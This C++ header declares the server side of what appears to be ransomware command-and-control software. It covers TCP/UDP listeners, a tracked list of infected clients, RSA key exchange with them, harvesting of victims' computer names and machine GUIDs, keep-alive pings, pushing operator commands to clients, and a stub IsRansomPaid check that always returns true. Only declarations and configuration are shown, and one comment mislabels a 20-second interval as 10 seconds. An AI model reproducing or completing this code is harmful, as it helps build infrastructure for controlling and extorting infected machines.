#pragma once

#include "Client.h"
#include "External/json.hpp"

#include <mutex>

using JSON       = nlohmann::json;
using ClientList = std::unordered_map<long, Client>;

class ServerInterface
{
public:
    explicit ServerInterface(int UDPPort, int TCPPort);
    ~ServerInterface();

    bool              StartServer(Server& server);
    void              ShutdownServer(bool confirm);
    Server            NewServerInstance(SocketTypes serverType, int port);
    bool              SaveServerState();                    // save the server state in a json file
    JSON              ReadServerStateFile() noexcept;        // parse server state file as json
    Client*           GetClientSaveFile(long cuid);            // get properties of a client from the server save file
    void              SendCommandsToClients();
    void              OutputServerCommands();
    ClientList&       GetClientList();
    Packet            PingClient(long cuid);
    Client*           GetClientPtr(long cuid);
    void              SendKeepAlivePackets(long cuid);
    inline Server     GetTCPServer() const { return this->m_TCPServerDetails; }
    inline Server     GetUDPServer() const { return this->m_UDPServerDetails; }
    const inline auto ReadConfig()   const { return this->m_Config; };
    bool              IsClientInSaveFile(const std::string& machineGUID);
    void              RemoveClientFromServer(Client* client);

protected:
    inline bool       IsRansomPaid(Client client) { return true; } // return true always. 
    void              RunUserInputOnClients();
    bool              HandleUserInput(unsigned int command, Packet& outputCommand);
    void              OnTCPConnection(SOCKET connection, sockaddr_in incoming);
    bool              PerformRequest(const Packet& req, Server on, long cuid = -1, sockaddr_in incoming = NULL_ADDR);
    bool              ExchangeCryptoKeys(long cuid);
    bool              IsServerCommand(long command);
    bool              AddToClientList(Client client);
    bool              ClientIsInClientList(long cuid);
    void              AcceptTCPConnections();
    bool              GetClientComputerName(long cuid);
    bool              GetClientMachineGUID(long cuid);
    void              ListenForUDPMessages();
    void              TCPReceiveMessagesFromClient(long cuid);
    Packet            WaitForClientResponse(long cuid);
    Packet            WaitForClientResponse(Client* client);
    unsigned int      GetFlagsFromInput(const std::string& s);
    void              OnKeepAliveEcho(long cuid, Packet& packet);

private:
    ClientList        m_ClientList;
    std::mutex        m_ClientListMutex; // concurrency
    Server            m_TCPServerDetails;
    Server            m_UDPServerDetails;
    RSAKeys           m_SessionKeys; // RSA keys for the duration of the server session. public key is shared with clients
    NetworkManager    m_NetworkManager;

    struct {
        std::string   serverStatePath      = ".";
        std::string   serverStateFilename  = "server_state.json";
        std::string   serverStateFullPath  = serverStatePath + "\\" + serverStateFilename;
        std::string   serverConfigPath     = ".";
        std::string   serverConfigFilename = "server_conf.json";
        std::string   serverConfigFilePath = serverConfigPath + "\\" + serverConfigFilename;
        std::string   domainName           = DNS_NAME; // DNS tcp server is running on, from Client.h
        const UINT    maxConnections       = 100;      // re build to change max connections
        long          TCPPort              = -1;       // Setup alongside ServerInterface constructor
        long          UDPPort              = -1;       // Setup alongside ServerInterface constructor
        const UINT    keepAliveIntervalMs  = 20000;    // 10 seconds
        const UINT    keepAliveTimeoutMs   = 5000;     // 5 seconds 
    } m_Config;
};